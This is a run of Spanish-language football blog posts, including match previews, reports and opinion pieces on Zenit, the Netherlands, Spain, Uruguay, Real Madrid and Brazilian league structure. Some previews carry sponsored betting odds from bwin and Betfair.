industria armamentística y metalúrgica reunidos para disfrutar de las más variadas disciplinas deportivas. Y ahí, en ese vivero deportivo tan amateur, vio la luz el Stalinest equipo de fútbol que algunos años más tarde, en 1940, cambiaría definitivamente su nombre oficial por el de Zenit, heredando asi el de la sociedad deportiva soviética bajo cuyo manto llevaba creciendo poco más de una década.Condicionado por el movimiento de centralización en la URSS, el Zenit de San Petersburgo (hasta 1991, Zenit de Leningrado) nunca estuvo cerca de las posiciones de privilegio en la competición liguera soviética. Sólo un torneo de Copa en periodo de guerra (1944) y un único entorchado liguero, ya en 1984, jalonaban su exiguo palmarés hasta la adquisición del accionariado mayoritario por parte de la compañía del sector energético Gazprom en diciembre de 2005, hecho que podría ser considerado como el punto de inflexión del fútbol ruso moderno.Desde la desmembración de la URSS en 1991 hasta ese año 2005, solo el Alania Vladikavkaz, en 1995, había conseguido sacar el título de liga de la capital. El dominio moscovita en el fútbol ruso post-soviético era total y absoluto, algo que a Aleksandr Dyukov, hombre de negocios, presidente del consejo de administración de Gazprom y seguidor incondicional del Zenit, no parecía dispuesto a seguir permitiendo. La millonaria operación por la que Gazprom terminó adquiriendo el 76% del accionariado del club empezó a dibujar un nuevo escenario futbolístico en Rusia. Un escenario que tenía un hueco reservado para el ambicioso proyecto del Zenit de San Petersburgo que, gracias al sustento económico de su nuevo propietario mayoritario, por fin se encontraba en condiciones de competir con el poderío de los grandes clubes de la capital del país.En el plan de crecimiento y desarrollo del club previsto por Gazprom, dos objetivos aparecían en el horizonte más próximo: conquistar el campeonato de liga ruso y tratar de luchar por un título europeo. El primero de los dos objetivos apenas tardó dos temporadas en alcanzarse. En 2007, el Zenit volvía a convertirse, veintitrés años después de su primer y único título de Liga, en el mejor equipo del país, con una plantilla en la que ya habían empezado a hacerse notar los millones del gas y el petróleo y en la que resaltaban los nombres de Pavel Pogrebnyak, Andrei Arshavin o el técnico Dick Advocaat. Solo un año más tarde, llegaría el segundo de los objetivos planteados. Tras deshacerse de equipos como Villarreal, Olympique de Marsella, Bayer Leverkusen, y apear en la semifinal al Bayern de Múnich con un escandaloso resultado global en la eliminatoria de 5-1, el Zenit conquistó la Copa de la UEFA 2007/08 tras vencer en la final al Rangers por dos goles a cero. El plan estaba funcionando según el guión previsto.La siguiente etapa planteaba un tercer objetivo considerablemente más complejo. El Zenit debía de convertirse en un equipo potente a nivel continental y ratificar su dominio en Rusia. Sin embargo, y pese a que las inversiones millonarias continuaron año tras año (Hulk, Witsel, Criscito, Danny, Rondón…) para modelar una plantilla de relumbrón, el peldaño de la Liga de Campeones continúa resistiéndose a orillas del Nevá.En la edición 2011/12 del máximo torneo continental, el equipo alcanzó los octavos de final y fue eliminado por el Benfica, una situación muy similar a la que podría confirmarse esta noche en el Westfalenstadion de Dortmund. Tras los sucesivos fracasos de Luciano Spalletti, técnico del equipo desde diciembre de 2009 hasta hace un par de semanas, en su lucha por continuar cumpliendo con el guión marcado por Gazprom allá por 2005, la nueva apuesta arranca en la contratación del portugués André Villas-Boas como nuevo técnico del equipo. Y lo hace con una obsesión en la cabeza, una nueva página en la hoja de ruta de Gazprom. Superar por fin, casi una década después de la llegada de la compañía energética, el infranqueable muro de los octavos de final.Puedes comprar camisetas y demás indumentaria del Zenit de San Petersburgo en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Hay resacas especialmente pegajosas y molestas. Te mantienen todo el día después en un estado semi catatónico, en una especie de hibernación forzosa en la que tratas de fondear el barco a base de chutes programados de vitamina B-12. Son esos días en los que te sientes entregado, incapaz de responder ante los estímulos, decidido a dejarte llevar por el crudo vaivén de la realidad y por ese recuerdo infame, ese sabor pastoso deshaciéndose en tu boca y ese molesto, continuo y taladrante pitido en tu oído. La fiesta de Holanda en Brasil del pasado verano salió cara. Tampoco es que el equipo que por entonces aún dirigía Louis van Gaal se pegase el gran desfase en el torneo mundialista, pero una trabajada trayectoria hasta semifinales con dos tandas de penaltis incluidas, el regusto duradero de la sonada revancha frente a España en el primer encuentro y una concadenación de partidos bajo una temperatura y humedad asfixiantes dejaron a la Oranje con el estómago y la cabeza para el arrastre, dispuesta a pasar un domingo de cama y luces apagadas.Conocida la renuncia de van Gaal tras el torneo mundialista, la federación neerlandesa decidió que la mejor fuente de vitamina B-12 posible iba a venir de la mano de un viejo conocido, de un remedio ya probado en anteriores ocasiones. Guus Hiddink tenía por delante la complicada misión de recuperar a un grupo muy joven de futbolistas que mantiene la renovación iniciada meses atrás por el propio van Gaal y de encaminar su breve proyecto (Hiddink será sustituido en el banquillo por Danny Blind de cara a las clasificatorias del Mundial de Rusia) hacia la Eurocopa del año 2016 reafirmando el buen papel firmado en Brasil. Pero los efectos de la consabida resaca post-mundial están siendo más persistentes de lo inicialmente previsto.Con tres partidos jugados en la fase de clasificación de la Eurocopa, el bloque de Hiddink apenas ha podido sumar tres puntos, los que corresponden con la (muy trabajada y sufrida) victoria en Amsterdam ante una débil Kazajistán que llegó a adelantarse en el marcador y estar por delante hasta pasado el minuto sesenta de partido. La derrota en Praga (2-1) en el primer partido de la liguilla supuso un serio toque de atención.Y el partido, aunque constantemente interrumpido por la gente que entraba al campo como las gotas de sopa se desparraman al borde de una escudilla, se acabó jugando. Un milagro como cualquier otro, que dejó como herencias un título para el Bolton, la fama eterna de un policía y su caballo, y, entre otros millones de ellas, las entradas impresas que esta noche facilitarán el acceso, en el mismo lugar, a otro estadio. Sólo con que la final de hoy produzca una historia como ésta, habrá merecido la pena. El periplo de la selección española en la Eurocopa de Polonia-Ucrania está recordando punto por punto al vivido hace dos años en el Mundial de Sudáfrica: un tropiezo inesperado al comienzo, aunque considerar como tal empatar con Italia sea resulte un poco audaz; un debate tan acre como inesperado, la presencia de Busquets antes, el falso nueve ahora; un partido sencillo con derrota clara para espantar las dudas y las discusiones, y finalmente, un rival de nivel medio con el que cerrar una clasificación que de momento no está garantizada. Allá fue Chile, hoy le toca a la Croacia de Bilic.Aunque de puertas afuera Del Bosque defendiese su decisión inicial de alinear a España sin delantero puro, es difícil pensar que vuelva sobre sus pasos después del buen resultado que le ha dado a la Roja, tanto en juego como en goles, la alineación de un ariete. Asimismo, si Del Bosque ha confiado en Torres cuando arreciaba la tormenta que denunciaba su deficiente temporada y su escaso rendimiento en la selección desde la Eurocopa 08, nada hace pensar que no vaya a hacerlo ahora que un doblete fortalece la posición del Niño dentro del equipo. Muy difícil será que Negredo llegue incluso a debutar, y Llorente no pasará, si acaso, del papel de revulsivo que ya desempeñó hace un par de años. Parece mentira que un mes malo de todo el Athletic haya cambiado tanto la visión que se tiene de él.Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Esto aparte, y tras las decisiones de los dos primeros partidos, las preferencias del seleccionador –renovado ayer mismo- parecen haber quedado claras: excepto lesión o sanción, el equipo titular está completamente definido, incluido el polémico doble pivote, Xavi en su lugar de siempre y el maravilloso dueto Iniesta–Silva –que ante Irlanda firmó un manifiesto en defensa del trequartismo- por delante. Quizá esta noche,  si el partido sale de cara, sea el momento de proteger a un Xabi Alonso amenazado de sanción, máxime si tenemos en cuenta que la hoja de amarillas queda limpia a partir de cuartos. Aparte esto, no se debe esperar mayor cambio en un equipo que en el último partido firmó un segundo tiempo de ensueño. Lo percibió mejor que nadie Cesc Fàbregas, cuyo gesto tras anotar el cuarto gol denotó convicción en que, a pesar de los dos goles logrados, su papel en la Euro no pasará de residual. ¿Y qué puede decirse de Croacia? A priori su plan de juego, nada rígido, algo anárquico y muy supeditado a las características de sus futbolistas, beneficia a España, un equipo que por su forma de jugar descubre con enorme rapidez los defectos posicionales de sus rivales. Como de costumbre, una gran parte del rendimiento de la selección ajedrezada dependerá de la prestación de Luka Modric, un futbolista cuya calidad no discute nadie, pero sí su posición ideal (mediocentro o enganche) y su tendencia a irse de los partidos; hoy tendrá una prueba muy difícil en un encuentro donde disfrutará de poco balón. Quizá hoy toque fijarse más en Mandzukic, tan importante en la Euro como lo fue durante su temporada en el Wolfsburgo, y que acabó ligeramente tocado el choque contra Italia. O en Rakitic, cuyo cambio de posición en el segundo tiempo, de la banda al centro, fue decisivo en el partido contra los azzurri. Probablemente la mayor parte de las posibilidades de Croacia pasen por estos tres nombres.No podemos terminar sin hacer aunque sea una breve referencia al dichoso biscotto, el presunto pasteleo del que todo el mundo habla. Que un resultado clasifique a los dos que disputan un partido y deje fuera a terceros es algo tan antiguo como los propios torneos, y hemos visto recientemente ejemplos poco edificantes de este tipo de cosas. No resulta extraño, por tanto, que en Italia anden con la mosca detrás de la oreja, primero porque desde fuera se mira el fútbol español con cierta sospecha (ver Lippi ayer), quizá no sin motivo, y segundo porque la herida de la eliminación de 2004 tras un 2-2 entre selecciones “amigas” aún no se ha cerrado. Comprendiendo el resquemor, la verdad es que resulta muy difícil pensar que un resultado como este pueda pactarse, al menos a priori. Confiemos en ello.En bwin.es, por ejemplo, no se creen mucho la historia del pacto, pues el famoso empate a dos se paga a 8.00. Quizá sea más interesante pensar en el 1,48 a la victoria de España, un buen rédito si confiamos en la campeona, o el 9,50 en las apuestas por el triunfo croata, sorpresa ma non troppo si empiezan marcando. Cualquier tanto de Jelavic o Mandzukic, los delanteros balcánicos titulares, se paga a 3,25, mientras que los torristas que confíen en un nuevo doblete de Fernando saldrían por 6,00 euros. Finalmente, recomendamos a nuestros lectores la nueva opción de Scorecast -apuestas a primer goleador y resultado- cuyos réditos son tremendos: por ejemplo, un gol de Rakitic con 2-1 final para España se paga a 151 euros. La locura. Corrió estos días atrás por internet una historia sobre Lisandro López (Rafael Obligado, 1983). La anécdota cuenta que el delantero, contrariado e iracundo por no gozar de la titularidad frente al Nancy, golpeó un balón con tal fuerza y se hizo tanto daño que la gracia acabó costándole la ida de la eliminatoria contra el Madrid. Seguramente la anécdota es apócrifa -la desmintió poco después Claude Puel– pero es tan descriptiva y recoge tan económicamente el carácter del personaje que podemos apostar que se contará, como verídica, de generación en generación. De hecho, si el Lyon se impone esta noche, la historia acabará relatando cómo el héroe volvió justo a tiempo para salvar a los suyos, mientras que si es el Madrid el que gana, se achacará la derrota a la ausencia inicial del salvador. Es lo que tienen los mitos, que siempre salen ganando, en presencia o en ausencia. Y Lisandro tiene muchos pronunciamientos para acabar convirtiéndose en uno, ya que si algo destaca en muchos jugadores que acaban haciéndose inolvidables, es el carisma.Porque sin duda alguna estamos hablando de uno de los nueves claves para entender la supervivencia de esta especie -siempre en peligro de extinción- en los comienzos del siglo XXI. Los talibanes del cambio de posición constante, el fútbol total y otras zarandajas abominan de la demarcación; pero mientras existan delanteros fuertes como toros, con suficiente conocimiento del oficio para saber cuándo ir a banda y cuando pelear la posición, y ese intangible llamado olfato para empujar lo que es fácil si estás en tu sitio e imposible si no lo estás, siempre habrá entrenadores dispuestos a modificar su esquema por ellos. Porque ganan partidos.Así ha sido siempre Licha, y así ha triunfado donde ha ido: primero haciéndose un nombre en Racing, luego en un Oporto que como trampolín de buenos futbolistas no tiene parangón en el continente, y de momento en ese Olympique que lleva quizá demasiado tiempo sin subir el peldaño final que le separa de la aristocracia europea. Quizá no está siendo la mejor temporada del argentino -aunque haya repuntado estos últimos partidos- pero no hay duda de que si en algún momento el OL consigue al fin aparcar la timidez y hacerse respetar, será con jugadores como éste, gladiadores llenos de clase destinados a ser recordados. El coliseo de la Castellana lo espera. A lo largo del Campeonato del Mundo, y de la mano de Betfair.com, os  ofreceremos un análisis previo de los partidos más interesantes del  torneo, prestando una especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Cuando Alemania concluyó su puesta de largo en este Mundial, el día 16 de Junio en Durban, suspiros de admiración y alivio pudieron escucharse frente a las pantallas de televisión de medio mundo. Tras un terrible comienzo de campeonato, repleto de partidos infumables, defensas férreas y tacticismo exagerado –en el peor sentido de la palabra- por fin surgía un equipo que saltaba al campo más preocupado de ganar al rival que de recibir goles, proponiendo en vez de esperando, más hambriento que temeroso. Es verdad que Australia no parecía un rival de cuidado, pero el Mundial está repleto de equipos de un nivel parecido, y no hemos presenciado hasta ahora ningún abuso como el que llevaron a cabo los germanos en su debut. El sentimiento de que el 4-0 resultó corto fue unánime.Para realizar exhibiciones de tal calado normalmente no basta con una idea o un dispositivo táctico adecuado, sino que hacen falta futbolistas de un cierto nivel; en este sentido, pocas selecciones han mostrado una pléyade tal de jugadores prometedores, tanto por su nivel futbolístico como por su juventud. A la cabeza de todos Mesut Özil, el joven mediapunta del Werder Bremen que ha asombrado en la posición de mediapunta, tan despreciada en el torneo. Por delante de él Thomas Müller, el ligero talento del Bayern que maneja como un veterano el manual de delantero; justo por detrás la sobriedad de Sami Khedira, y en la recámara el descarado Marko Marin, ideal por sus características para actuar de revulsivo. Una colección de perlas emergentes que se alejan tanto en lo físico como en la forma de jugar del prototipo panzer, y que refleja de un modo tan deseable como la Francia del 98 el mestizaje que caracteriza a la Europa de principios de siglo. El rendimiento habitual de Podolski con la Mannschaft y el oficio de Klose completaron el pastel para que Alemania arrasara a los canguros.En el segundo partido, sin embargo, la combinación de la astucia de ese viejo zorro que es Antic y la diarrea tarjetera de Undiano –rara en él- se combinaron para mandar a la lona a los de Löw y templar un poco el optimismo que rodeaba a la selección. El dispositivo de centrocampistas que montó Rado cortocircuitó a Alemania –y muy en particular a Özil, el generador de juego- la temprana expulsión de Klose y el gol de REF revolcaron un partido que los germanos, a pesar de dar la cara en todo momento, no pudieron levantar. Una derrota honrosa que no ha sembrado dudas en el modelo, que deja una vacante en la punta de la lanza para que entre el eléctrico Cacau, y sobre todo recuerda que esto es un Mundial y que nadie concede lo más mínimo, mucho menos en el que quizá junto con el G es el grupo más duro de todos.No conviene olvidar además que Ghana, rival de los alemanes en el partido decisivo, es el líder del grupo. Privado de su mejor hombre, Michael Essien, y con un centro del campo lleno de futbolistas de perfil parecido, el combinado de Rajevac ha ofrecido el mismo el mismo perfil plano que el resto de los equipos africanos del campeonato, pero al menos ha sacado más partido de los regalos ajenos –muy especialmente manos en el área- que de los propios –grave error del guardameta Kingston contra Australia. Sin embargo, su falta de ambición en este partido, en el que jugó durante más de un tiempo contra diez jugadores, puede pasarle factura en un encuentro final muy duro en el que la derrota sería casi definitiva. Prevemos un choque con los roles muy claros, con Alemania buscando una victoria que seguramente necesitará, y Ghana atrincherada esperando su momento o el error individual del que ha vivido hasta ahora. En el horizonte Inglaterra, Estados Unidos o quizá Eslovenia.La victoria alemana se cotiza a 1,51 en Betfair, el empate a 4,5 y la victoria africana a 8.En un partido que se presume de mucho contacto y de balones al área, es interesante observar que el hecho de que haya algún penalti se cotiza a 3,6. Además, 4 o más goles de Alemania –opción no descabellada si los europeos marcan pronto y Ghana ha de abrirse- dan un rendimiento de 10 euros. Como hace tres años, los dos equipos más laureados del torneo del K.O. se medirán en la final, ya veremos dónde. El Barcelona ha despachado esta noche al Valencia en un ejercicio de suficiencia que alcanzó la brillantez en muchos momentos, especialmente en la segunda mitad del primer tiempo. Paradójicamente, el partido había comenzado con dominio che, pero una indecisión entre Miguel y Alves permitió a Cesc marcar de disparo parabólico y virar la contienda. Siguió un chorro de ocasiones marradas del Barcelona, cuya delantera volvió a hacer grande al portero rival. En el segundo tiempo bajó el ritmo, posesión habitual de los locales punteada por alguna ocasión del Valencia, y el partido se acabó cerrando primero con la justa expulsión de Feghouli, y luego con un estupendo disparo a la escuadra de Xavi, reaparecido hoy. Muy destacable el partido de Cesc, especialmente en el primer tiempo, y también el de Pinto, pleno de reflejos toda la noche. Al Valencia, lastrado por la ausencia obligada de Soldado, le han pesado la poca presencia de Banega y la mala actuación de Víctor Ruiz, frágil y distraído toda la noche. Y Emery sigue sin ganarle a Guardiola, que va a por su título número catorce como entrenador del Barça. Que se dice pronto. Vaya por delante que las reivindicaciones de la LFP pueden ser perfectamente admisibles. Es legítimo y lógico que la asociación de clubes siempre quiera sacar más dinero de donde cree que es posible hacerlo, y que vea el fútbol en abierto como contrario a sus intereses. En particular, y a través de este caballo de batalla concreto, se pretende mantener abierto –al menos, por algunos clubes- el debate sobre el reparto del dinero de las televisiones, vital en el desarrollo de la competición en años venideros. Hasta aquí, todo bien.Sin embargo, lo que a uno le deja perplejo es que el sistema que utilicen para que el Gobierno acceda a su propuesta sea interrumpir una jornada la competición. Cuando uno realiza una huelga o cierre patronal, debe asegurarse que el colectivo que resulta perjudicado –los espectadores en este caso- derive, al menos en parte, el subsiguiente malestar en el organismo que pueda satisfacer las reivindicaciones de los convocantes. La impresión, en cambio, es que un simple aplazamiento de una jornada de Liga no va a preocupar en exceso al aficionado, máxime en medio de la saturación futbolística en la que vivimos y contando con la absoluta seguridad de que los partidos van a disputarse pocas fechas después. La única medida de este tipo que podría tener cierta incidencia sería un paro indefinido, que es inviable por el perjuicio que causaría a las operadoras que transmiten el fútbol y, en gran parte, lo financian.En cualquier caso, es muy improbable que con este toque de atención consiga la LFP los resultados deseados, y menos a corto plazo; en primer lugar, la ley Cascos es una patata caliente que varios gobiernos no han deseado afrontar, y es improbable que vayan a hacerlo ahora estando la situación política como está; y en segundo lugar, precisamente por esto, lo último que podemos esperar en un momento de crisis es que se adopte una medida tan impopular como cerrar la única ventana gratuïta que le queda al fútbol en España. Lo que sí es indiscutible es que este asunto va a deteriorar aún más la imagen pública de la Liga Profesional, vista comúnmente como una asamblea de despilfarradores y avariciosos, donde la más mínima sombra de consenso brilla por su ausencia y en la que el bien del fútbol es lo menos importante. No sabemos hasta qué punto la imagen se corresponderá con la realidad, pero lo que está claro es que medidas tan importunas, absurdas e inútiles como ésta colaboran en su difusión, y muy en particular cuando los motivos de calendario que dio el propio Astiazarán para oponerse a la huelga de futbolistas siguen siendo válidos a día de hoy. Estaremos atentos a la decisión judicial. Si hay un país que lleva grabado a fuego los Mundiales en su ADN, y que a su vez ha dejado su impronta indeleble en la historia de los campeonatos, ese es Uruguay. Muy pocos quedan vivos que puedan contar en primera persona los títulos de los charrúas, pero aún son menos los aficionados al fútbol que no se hayan encontrado en algún momento con la mítica del Maracanazo, el gol de Gigghia, el estadio del Centenario o el primer país organizador de un Mundial. Mitos omnipresentes del balompié.Sin embargo, así como es cierto que el bicampeonato proporciona a la selección sudamericana un caché que nadie podrá nunca quitarle, también lo es que su historia reciente en la Copa del Mundo es un homenaje al despropósito. Ausentes inesperadamente en el último campeonato tras una improbable repesca frente a Australia, de 2002 sólo dejaron la gran remontada contra Senegal que no sirvió para nada, y un par de presencias en octavos en México e Italia apenas destacan de una trayectoria jalonada por más ausencias de las debidas. De hecho, no anduvo lejos la escuadra de Tabárez –un técnico mucho más apreciado en América que en Europa- de quedarse también fuera de esta Copa del Mundo. Los charrúas firmaron una fase de clasificación bastante irregular, en la que una cascada de empates en casa ante rivales en principio más débiles, el solitario gol de Rengifo en Lima y, sobre todo, la dolorosa derrota en casa ante los archirrivales del otro lado de la Plata condenaron a la selección uruguaya a jugárselo todo ante Costa Rica en la repesca. Tras una eliminatoria con tintes agónicos, en la que un gol de Walter Centeno en el partido de vuelta dejaba a los ticos a un solo gol de la clasificación a falta de un cuarto de hora, los uruguayos lograron el ansiado billete a Sudáfrica y se convirtieron en la última selección en hacerlo.El sufrimiento de la fase de clasificación ya ha quedado atrás, sin embargo, y de cara al Mundial la selección charrúa presenta a priori unos mimbres que permiten soñar, al menos, con los octavos, sobre todo considerando que el grupo A seguramente es el de pronóstico más difícil. El profesor ha construido un bloque sólido, tan falto de creatividad en el centro del campo como poderoso en las dos áreas. Muslera, un arquero en crecimiento, será casi con toda seguridad el titular, y le resguardan por delante Lugano y Godín, con toda seguridad una de las mejores parejas de stoppers del torneo, y Pereira y quizá Fucile en los laterales, gente más solvente que brillante. El centro del campo presenta demasiado repetido el perfil del medio peleón todoterreno –Eguren, Gargano, Ruso Pérez– y quizá es demasiada la responsabilidad que va a recaer sobre el joven Lodeiro, jugador fino pero aún poco curtido al más alto nivel. Quizá se eche en falta al Cebolla Rodríguez, un perfecto agitador cuando los partidos se cierran y y hay que abrir el juego a los costados. La delantera, con Diego Forlán y Luis Suárez de titularísimos, está fuera de toda duda: sobre el atlético huelgan comentarios porque lo conocemos de sobra, mientras que al joven ajacied estamos ya deseando verlo desde hace tiempo en una de las grandes ligas, ya que la Eredivisie se le queda muy pequeña a un jugador con su olfato, velocidad y capacidad de desmarque.Estas son las bazas, pues, que presenta un equipo fuerte y aguerrido, muy en la tradición uruguaya, y del que podremos esperar competitividad más que estética, partidos con pocos goles y la seriedad con la que los charrúas siempre han interpretado el fútbol. No es poco.Lo mejor: los centrales y la pareja de delanteros, dinamita pura.Lo peor: la falta de juego en el centro del campo.Jugador a seguir: la pareja del Ajax, Lodeiro y Luis Suárez. A Forlán no hace falta seguirlo ya para saber que es el matador.Pronóstico DDF: octavos o cuartos, dependiendo de si quedan segundos o primeros, respectivamente. Un choque en octavos con Argentina sería tremendo. En un partido que hizo honor a su nombre, el Real Madrid ha despachado 4-2 a un Villarreal que durante la primera media hora dio la impresión de estar a su altura, si no más arriba. Roto muy pronto el choque con los goles sucesivos de Cani, Cristiano y Ruben, los amarillos reventaron la banda izquierda del Madrid para sembrar el pánico con rápidas y precisas combinaciones en corto. Lentamente, los valencianos dieron un paso atrás, y aunque el partido parecía estar bajo su control, un cabezazo de Cristiano al borde del descanso volcaba moralmente la contienda. Tras la entrada de Khedira y Kaká y sobre todo la retirada de un nefasto Lass, los merengues salieron con otro ánimo en la segunda mitad, y acabaron dibujando un partido de una sola dirección ante un rival que se hundió físicamente. La resolución se aplazó hasta el último cuarto de hora, en que Cristiano acabó embocando a la media vuelta tras una jugada extraña, y Kaká empezó a firmar su redención cerrando el partido con un remate sobre la marcha. Los blancos prosiguen así la caza del Barcelona -aunque a día de hoy la distancia futbolística entre ambos conjuntos es sideral- y el Villarreal, a once puntos del segundo, tendrá que conformarse con luchar por el título de la Liga de los pobres. Prosigue el Madrid marcando el paso de esta Liga haciendo uso de un arma que este año aún no había sido necesaria: la remontada. Lo ha obligado a ello Trezeguet, protagonista de alguna noche negra reciente del madridismo, con un espléndido testarazo cuando los futbolistas casi se estaban atando aún los cordones. El tanto del francés ha dado paso a un primer tiempo muy igualado, mérito de un Hércules que ha entendido muy bien el tempo del choque –estupendo Tiago Gomes en el medio- ha montado veloces contragolpes y se ha mostrado muy certero en los centros laterales. El Real Madrid, algo obtuso y frío en la primera mitad, se ha metido definitivamente en el partido recién vuelto del descanso, tras un cañonazo de Di María que ha penalizado un defectuoso despeje de un por demás inspirado Calatayud. El punto de inflexión, marcado también por el bajón físico del Hércules, ha determinado un segundo tiempo de una sola dirección, jugado casi exclusivamente en el terreno local. Con Cristiano Ronaldo creciendo y Di María y sobre todo Marcelo plenos de intensidad y verticadlidad, el mazo ha ido golpeando el muro hasta que un remate a quemarropa del astro portugués lo ha acabado derribando. La noticia del último tramo del choque ha sido el resucitado Benzema, muy activo y protagonista en las jugadas de los dos últimos goles. Un partido, en suma que ha demostrado tanto la solidez del Madrid como la solvencia de un Hércules que no debe tener ningún problema para mantenerse en la categoría de oro del fútbol español. Todos sabemos que la patria chica del fútbol es Brasil, aunque naciera en Inglaterra. Ningún país, ni históricamente ni en el presente, se acerca la cantidad de jugadores que cada año se genera en el gigante sudamericano, y seguramente nadie quiere tanto a este deporte como ellos. En Brasil juega todo el mundo a o futebol, desde el niño humilde de la favela hasta Ronaldinho, desde los descampados más desiertos de Belo Horizonte hasta el venerable césped del viejo Maracaná. Esta fiebre por el deporte rey, combinada con la enorme extensión del país, ha producido un cambiante sistema de competición que al final, no tiene otro objetivo que dar cabida y motivación al sinnúmero de equipos diseminados por el país. En estas dos entradas nos proponemos dar una sucinta guía para no perderse en la frondosa selva futbolística brasileña, en la cual –la historia nos lo ha demostrado- el talento mayúsculo puede surgir en cualquier momento, en cualquier lugar.El sistema de competición brasileño se disputa en la actualidad en dos periodos. En el primero, que se extiende a lo largo de los cinco primeros meses del año, está reservado para los campeonatos estatales, mientras queen  el segundo, que acaba de inaugurarse, se juega el campeonato nacional, conocido en su máxima categoría como Brasileirao. Ambos periodos están interconectados, del modo que veremos un poco más adelante.La estructura más normal es la del campeonato nacional. En él compiten 100 equipos, que teóricamente son cada año los mejores del país, y que se distribuyen en cuatro divisiones, exactamente igual que ocurre en las ligas europeas; las tres primeras categorías tienen 20 equipos cada una, mientras que la cuarta contiene a los restantes 40. El sistema para las dos primeras categorías es el lógico: todos contra todos, el que venza la serie A campeón (el año pasado el Flu), los cuatro últimos de cada categoría al hoyo, y los cuatro primeros de la serie B ascienden. Nada nuevo bajo el sol.El lío comienza cuando nos adentramos en la serie C, y en la D se vuelve casi intratable.Los veinte equipos de la serie C se distribuyen en cuatro grupos de cinco equipos, que juegan todos contra todos a doble vuelta. Los colistas bajan a la serie D, mientras que los dos primeros de cada grupo se juegan un torneo de Copa a doble partido (la utilidad de la “fase regular”, por tanto, es discutible). Aquí basta pasar la primera ronda para asegurarse el ascenso, pero esta gente se lo toma en serio y se acaba jugando el título a doble partido.Como decíamos, la serie D es una locura. En la primera fase, los 40 equipos se distribuyen en diez grupos de 4, según el típico todos contra todos. Los dos primeros de cada grupo (veinte equipos en total, obsérvese que el numerito no es potencia de dos) se enfrentan a doble partido en dos rondas, con lo cual acaban quedando cinco. A estos se suman los tres perdedores de esta última ronda que más puntos hayan sumado en el total de los diez partidos, con lo cual, pasando ocho de diez, estaría bien que alguien explicara la utilidad de dicha ronda. Ni la liga regular de la ACB. Los supervivientes juegan una cuarta ronda, ésta ya a doble partido, que funciona exactamente igual que la correspondiente de la serie C: los semifinalistas ascienden, y hay un campeón (el año pasado fue el Guarany de Sobral, dicho sea de paso). ¿Y qué ocurre con los descensos? Pues que no los hay, y aquí entra la estructura de los campeonatos estatales, que recordaremos en la segunda entrada. Palermo y Udinese sumaron ayer un resultado escandaloso más (0-7) a una temporada que está resultando pródiga en ellos: recuérdese al Barça en Almería o al PSV frente al Feyenoord. Cual Puskas y Di Stéfano en Glasgow, Di Natale y el chileno Alexis Sánchez rubricaron, con tres y cuatro tantos cada uno respectivamente –ojo al regate ronaldiano en el tercero-, una goleada que pasa a los anales del Calcio, a la vez que condena al preparador Delio Rossi. El club siciliano había empezado bien la temporada, amparado en la finura y la contundencia de Pastore, pero se ha derrumbado en las últimas semanas víctima de una alarmante debilidad defensiva: baste recordar que en su última comparecencia como local la Fiore les hizo cuatro chicharros, o echar un vistazo al video adjunto, donde los errores van desde el fallo de marcaje del primer gol, grave pero más o menos habitual, a la barraca de feria, caso del cuarto. De hecho, el Udinese ha tenido piedad, pues no hizo más sangre de un rival que jugó la última media hora con nueve jugadores. En cualquier caso, un resultado que afianza al equipo friulano en la zona noble de la tabla, a la vez que dejará graves secuelas en el perdedor. Más que paliza, una humillación. No vamos a descubrir ahora que el Real Madrid es el mayor generador de noticias del fútbol español, y que frecuentemente la permanencia continua del equipo blanco en el centro del circo mediático perjudica tanto los intereses globales del club como la imagen particular del protagonista que se encuentra en cada momento en el centro de la diana. Ni los gestos de Cristiano, ni las salidas de pata de banco de Mourinho, ni las barbaridades de Pepe le hacen ningún favor ni a los implicados ni al club. A la inversa, cuando las cosas van más o menos bien –como ocurrió anoche, sin ir más lejos– un viento de alabanza desmedida recorre la prensa y los medios de comunicación, y las invocaciones a sueños, noches mágicas y, en general, a palabras escritas con mayúscula (Décima, Historia, etc.) imposibilitan cualquier valoración mínimamente crítica del evento en cuestión. Podríamos convenir, por tanto, que el exceso de exposición pública que sufre el Madrid es perjudicial para sus intereses. Sin embargo, hay un integrante de la plantilla blanca que se sirve, conscientemente o no, del estruendo generado a su alrededor para pasar desapercibido, y por tanto esquivar las dudas a que podría dar lugar su rendimiento. Estamos hablando de Sami Khedira, el futbolista invisible.Normalmente se suele aplicar, en el buen sentido, el adjetivo “invisible” a los mediocentros defensivos que realizan un trabajo oscuro, táctico, poco llamativo para el espectador medio, y que sin embargo suele resultar vital para su equipo. Ejemplo paradigmáticos en la actualidad serían Busquets o Mascherano, futbolistas aguerridos, con buena lectura del partido, capacidad para detener el juego del contrario en el momento justo, seguridad con el balón, control de la posición y buen pase corto. Jugadores cuya importancia acaba resultando capital, y cuyo valor se nota especialmente en la ausencia. Sin embargo, Khedira supone un ejemplo perfecto –no el único, desde luego- de hasta qué punto puede pervertirse la noción anterior sin que la diferencia sea perceptible por el respetable. Desde que llegase en verano procedente del Stuttgart, y con el cartel por las nubes después de que el Mundial de Sudáfrica reivindicara el fútbol alemán, el futbolista de origen tunecino se ha paseado como un espectro por el centro del campo del Bernabéu, mimetizado como un camaleón en un conjunto lleno de estrellas. En este tiempo hemos visto a un jugador que trota cual percherón por el centro del campo, y que suele acercarse al rival cuando controla la bola, pero rara vez entra a ella con decisión o la roba por anticipación. Un futbolista que no ayuda en la salida porque no tiene capacidad para ello, que  por sus problemas en los controles  nula visión de juego apenas causa daño en sus incorporaciones, y que anota como única virtud comprobable su poderío aéreo en los pelotazos que se descuelgan del cielo.Pero más allá de los defectos futbolísticos, lo más preocupante, y lo que lo hace más inválido para un equipo de las aspiraciones del Real Madrid, es su timidez, esa actitud timorata que es inconcebible en un medio centro. En la zona más caliente del campo, donde tantos jugadores sin recursos técnicos se han impuesto por personalidad o ganas de triunfar, encontramos un centrocampista que huye de la responsabilidad, que se evapora cuando el partido se endurece, y que prefiere siempre no intentarlo a equivocarse. Mucho de esto vimos anoche, en una primera media hora disputada donde no hubo rastro del alemán, y una última, con el partido cuesta abajo, donde sí que pisó área y algo se hizo notar. Siempre es más inteligente pasar desapercibido que recibir silbidos, pero también lo es que este tipo de jugador-mentira siempre acaba siendo descubierto, y a partir de ese momento el rodillo mediático suele emplearse a fondo con él. A día de hoy le favorece que Mourinho no tiene alternativa válida para el puesto, pero es francamente difícil imaginarse como campeón a un equipo donde más de un atacante 